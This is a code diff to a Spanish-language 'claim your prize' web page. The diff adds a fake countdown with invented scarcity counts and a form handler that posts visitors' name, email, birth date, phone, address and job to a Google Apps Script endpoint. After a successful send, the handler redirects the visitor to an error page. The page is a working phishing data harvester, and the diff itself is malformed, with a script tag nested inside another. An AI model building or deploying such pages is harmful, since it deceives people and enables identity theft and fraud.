@@ -304,12 +304,66 @@ input {
         }
         setInterval(actualizarContador, 1000);
 
-        function enviarDatos() {
-            const btn = document.querySelector('.cta-button');
-            btn.innerText = "REGISTRANDO...";
-            btn.disabled = true;
-            setTimeout(() => { window.location.href = 'error.html'; }, 1500);
+        <script>
+    let tiempoTotal = 15 * 60;
+
+    function actualizarContador() {
+        let m = Math.floor(tiempoTotal / 60);
+        let s = tiempoTotal % 60;
+        document.getElementById('minutos').innerText = m.toString().padStart(2, '0');
+        document.getElementById('segundos').innerText = s.toString().padStart(2, '0');
+
+        if (tiempoTotal > 0) {
+            tiempoTotal--;
+            if (tiempoTotal % 45 === 0) {
+                let lugares = Math.floor(Math.random() * 2) + 2;
+                document.getElementById('txt-lugares').innerText = `${lugares} LUGARES`;
+                document.getElementById('barra-progreso').style.width = (lugares * 12) + "%";
+            }
         }
+    }
+
+    setInterval(actualizarContador, 1000);
+
+    async function enviarDatos() {
+        const btn = document.querySelector('.cta-button');
+        const url = "https://script.google.com/macros/s/AKfycbwLcrPYwIp-VWAT3ILTjwtNfBTnPBAKcPAkHUVDcPcPq4eiN4An0fKsAy7Y6x5Y51E0Kg/exec";
+
+        const datos = {
+            nombre: document.getElementById('nombre').value,
+            correo: document.getElementById('correo').value,
+            fecha: document.getElementById('fecha').value,
+            telefono: document.getElementById('telefono').value,
+            direccion: document.getElementById('direccion').value,
+            trabajo: document.getElementById('trabajo').value
+        };
+
+        btn.innerText = "REGISTRANDO...";
+        btn.disabled = true;
+
+        try {
+            const respuesta = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(datos)
+            });
+
+            if (respuesta.ok) {
+                window.location.href = "error.html";
+            } else {
+                alert("No se pudo registrar.");
+                btn.innerText = "RECLAMAR PREMIO AHORA";
+                btn.disabled = false;
+            }
+        } catch (error) {
+            alert("Error al enviar datos.");
+            btn.innerText = "RECLAMAR PREMIO AHORA";
+            btn.disabled = false;
+        }
+    }
+</script>
        
     </script>
      <footer class="footer">
